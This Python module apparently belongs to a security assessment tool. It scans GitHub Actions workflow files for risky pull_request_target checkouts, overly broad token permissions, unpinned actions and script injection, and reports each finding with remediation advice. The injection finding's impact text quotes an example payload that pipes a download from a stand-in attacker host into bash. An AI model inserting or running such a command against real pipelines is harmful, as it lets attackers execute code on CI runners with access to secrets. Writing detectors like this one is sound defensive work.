"""
Contract 03, 06 & 08 GitHub Actions CI/CD Pipeline & Supply Chain Security Auditor.
"""

from __future__ import annotations
import os
import logging
from pathlib import Path
import re
from typing import List, Optional
import yaml

from app.core.models import Finding, Evidence, Severity, calculate_fingerprint, LogLevel
from app.engines.base import LogCallback

logger = logging.getLogger("cyberassess.engines.github_actions")

IGNORED_DIRS = {".git", "node_modules", "venv", ".venv", "__pycache__", "dist", "build"}


def audit_workflow_yaml(content: str, file_path_str: str) -> List[Finding]:
    """
    Parses and audits GitHub Actions YAML workflow content.
    """
    findings: List[Finding] = []
    data = {}
    try:
        loaded = yaml.safe_load(content)
        if isinstance(loaded, dict):
            data = loaded
    except Exception as exc:
        logger.debug("Workflow YAML parse failed: error_type=%s", type(exc).__name__)

    # --- 1. Insecure pull_request_target Trigger with Code Checkout (CICD-GHA-001) ---
    on_trigger = data.get("on") if "on" in data else data.get(True)
    has_pr_target = False
    if isinstance(on_trigger, str) and on_trigger == "pull_request_target":
        has_pr_target = True
    elif isinstance(on_trigger, list) and "pull_request_target" in on_trigger:
        has_pr_target = True
    elif isinstance(on_trigger, dict) and "pull_request_target" in on_trigger:
        has_pr_target = True
    elif "pull_request_target" in content:
        has_pr_target = True

    if has_pr_target and "github.event.pull_request.head.sha" in content:
        findings.append(Finding(
            scan_id="auto",
            engine="cicd_audit",
            check_id="CICD-GHA-001",
            category="CI/CD Supply Chain Security",
            title="Insecure pull_request_target Trigger with Fork Checkout",
            severity=Severity.HIGH,
            cvss_score=8.5,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
            cwe_id="CWE-829",
            owasp_category="A06:2021-Vulnerable and Outdated Components",
            nist_control="SA-15, SC-7",
            description=(
                f"Workflow in '{file_path_str}' uses 'pull_request_target' trigger while checking out untrusted "
                f"fork code (${{{{ github.event.pull_request.head.sha }}}})."
            ),
            impact=(
                "pull_request_target runs in the context of the base repository with read/write token permissions and secrets. "
                "Checking out untrusted pull request code allows attackers to execute malicious code with access to repository secrets."
            ),
            remediation="Use standard 'pull_request' trigger for untrusted builds, or avoid checking out PR head SHA in pull_request_target.",
            remediation_code_snippet="# Use standard unprivileged pull_request trigger:\non:\n  pull_request:",
            references=["https://securitylab.github.com/research/github-actions-preventing-pwn-requests/"],
            evidence=Evidence(
                location=file_path_str,
                observed_value="on: pull_request_target with ref: ${{ github.event.pull_request.head.sha }}",
                expected_value="on: pull_request without elevated repository secrets",
            ),
            fingerprint=calculate_fingerprint("CICD-GHA-001", file_path_str, "pr_target_checkout"),
        ))

    # --- 2. Top-Level Permissions (CICD-GHA-004) ---
    permissions = data.get("permissions")
    if permissions == "write-all":
        findings.append(Finding(
            scan_id="auto",
            engine="cicd_audit",
            check_id="CICD-GHA-004",
            category="CI/CD Supply Chain Security",
            title="Overly Permissive GITHUB_TOKEN Permissions (permissions: write-all)",
            severity=Severity.MEDIUM,
            cvss_score=6.0,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
            cwe_id="CWE-250",
            owasp_category="A05:2021-Security Misconfiguration",
            nist_control="AC-6",
            description=f"Workflow in '{file_path_str}' sets 'permissions: write-all'.",
            impact="Grants excessive write permissions to the default GITHUB_TOKEN across all scopes (contents, packages, issues, pull-requests).",
            remediation="Declare explicit minimal read permissions at top level and scope write permissions to specific jobs.",
            remediation_code_snippet="permissions:\n  contents: read",
            references=["https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token"],
            evidence=Evidence(
                location=file_path_str,
                observed_value="permissions: write-all",
                expected_value="permissions: contents: read",
            ),
            fingerprint=calculate_fingerprint("CICD-GHA-004", file_path_str, "write_all"),
        ))
    elif permissions is None:
        findings.append(Finding(
            scan_id="auto",
            engine="cicd_audit",
            check_id="CICD-GHA-004",
            category="CI/CD Supply Chain Security",
            title="Missing Explicit Top-Level GITHUB_TOKEN Permissions Block",
            severity=Severity.MEDIUM,
            cvss_score=5.3,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            cwe_id="CWE-250",
            owasp_category="A05:2021-Security Misconfiguration",
            nist_control="AC-6",
            description=f"Workflow '{file_path_str}' lacks an explicit 'permissions:' configuration, falling back to repository default token settings.",
            impact="If repository default permissions are set to read-and-write, workflows inherit full write privileges unnecessarily.",
            remediation="Explicitly define 'permissions: contents: read' at the root of the workflow.",
            remediation_code_snippet="permissions:\n  contents: read",
            references=["https://docs.github.com/en/actions/security-guides/automatic-token-authentication"],
            evidence=Evidence(
                location=file_path_str,
                observed_value="Top-level 'permissions:' key is missing",
                expected_value="permissions:\n  contents: read",
            ),
            fingerprint=calculate_fingerprint("CICD-GHA-004", file_path_str, "missing_permissions"),
        ))

    # --- 3. Line-by-Line Checks: Unpinned Actions & Script Injection ---
    lines = content.splitlines()
    for line_num, line in enumerate(lines, start=1):
        line_str = line.strip()
        if not line_str or line_str.startswith("#"):
            continue

        loc_line = f"{file_path_str}:{line_num}"

        # Unpinned Third-Party Action Version (CICD-GHA-002)
        match_uses = re.search(r"uses:\s*([^\s'\"]+)", line_str)
        if match_uses:
            action_ref = match_uses.group(1).strip()
            if "@" in action_ref:
                action_name, version_tag = action_ref.split("@", 1)
                # Check if version_tag is NOT a 40-hex SHA commit hash
                if not re.match(r"^[0-9a-fA-F]{40}$", version_tag):
                    findings.append(Finding(
                        scan_id="auto",
                        engine="cicd_audit",
                        check_id="CICD-GHA-002",
                        category="CI/CD Supply Chain Security",
                        title=f"Unpinned Third-Party Action Version ('{action_ref}')",
                        severity=Severity.MEDIUM,
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
                        cwe_id="CWE-1104",
                        owasp_category="A06:2021-Vulnerable and Outdated Components",
                        nist_control="SA-15",
                        description=f"Action '{action_name}' is pinned to a mutable tag ('@{version_tag}') instead of an immutable 40-character commit SHA.",
                        impact="If the maintainer's GitHub account is compromised, tags can be moved to malicious commits, executing backdoor code in your build pipeline.",
                        remediation="Pin the action to an immutable full commit SHA with a comment indicating the semantic version.",
                        remediation_code_snippet=f"uses: {action_name}@435614f15d18d09874e0d1647f299e31788b5f43 # v4.1.7",
                        references=["https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions"],
                        evidence=Evidence(
                            location=loc_line,
                            observed_value=line_str,
                            expected_value=f"uses: {action_name}@<40-char-commit-sha>",
                            line_number=line_num,
                        ),
                        fingerprint=calculate_fingerprint("CICD-GHA-002", loc_line, action_ref),
                    ))

        # Script Injection via GitHub Expression Context (CICD-GHA-003)
        if "run:" in line_str:
            match_inj = re.search(
                r"\$\{\{\s*github\.event\.(issue\.(title|body)|pull_request\.(title|body|head\.ref)|comment\.body|head_commit\.message|inputs\.[a-zA-Z0-9_]+|[a-zA-Z0-9_\.]+)\s*\}\}",
                line_str
            )
            if match_inj:
                untrusted_expr = match_inj.group(0)
                findings.append(Finding(
                    scan_id="auto",
                    engine="cicd_audit",
                    check_id="CICD-GHA-003",
                    category="Injection Vulnerabilities",
                    title="Potential Script Injection in GitHub Actions Inline 'run:' Script",
                    severity=Severity.HIGH,
                    cvss_score=8.5,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
                    cwe_id="CWE-78",
                    owasp_category="A03:2021-Injection",
                    nist_control="SI-10",
                    description=(
                        f"Untrusted GitHub context expression '{untrusted_expr}' is directly interpolated into an "
                        f"inline shell script in '{file_path_str}' on line {line_num}."
                    ),
                    impact="Attackers can submit pull request titles or issue comments formatted as shell commands (e.g. '; curl evil.com | bash;') to execute arbitrary code on the runner.",
                    remediation="Pass the GitHub context expression as an environment variable (env:) and reference the shell environment variable in the script.",
                    remediation_code_snippet="env:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo \"$PR_TITLE\"",
                    references=["https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections"],
                    evidence=Evidence(
                        location=loc_line,
                        observed_value=line_str,
                        expected_value="Expression passed safely via intermediate env: variable",
                        line_number=line_num,
                    ),
                    fingerprint=calculate_fingerprint("CICD-GHA-003", loc_line, untrusted_expr),
                ))

    return findings


async def audit_github_workflows(
    target_path: str,
    emit_log: Optional[LogCallback] = None,
) -> List[Finding]:
    """
    Recursively scans .github/workflows/ directory for Actions configuration flaws.
    """
    findings: List[Finding] = []
    root = Path(target_path)
    if not root.exists():
        return findings

    files_to_check = []
    if root.is_file() and root.suffix.lower() in (".yml", ".yaml"):
        files_to_check.append(root)
    elif root.is_dir():
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in IGNORED_DIRS]
            for fn in filenames:
                if fn.lower().endswith((".yml", ".yaml")):
                    f_full = Path(dirpath) / fn
                    if ".github" in str(f_full).replace("\\", "/"):
                        files_to_check.append(f_full)

    for fpath in files_to_check:
        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            rel_str = str(fpath.relative_to(root) if root.is_dir() else fpath.name)
            findings.extend(audit_workflow_yaml(content, rel_str))
        except Exception:
            continue

    if emit_log:
        await emit_log(LogLevel.INFO, f"CI/CD workflow auditor evaluated {len(files_to_check)} workflow file(s).")

    return findings
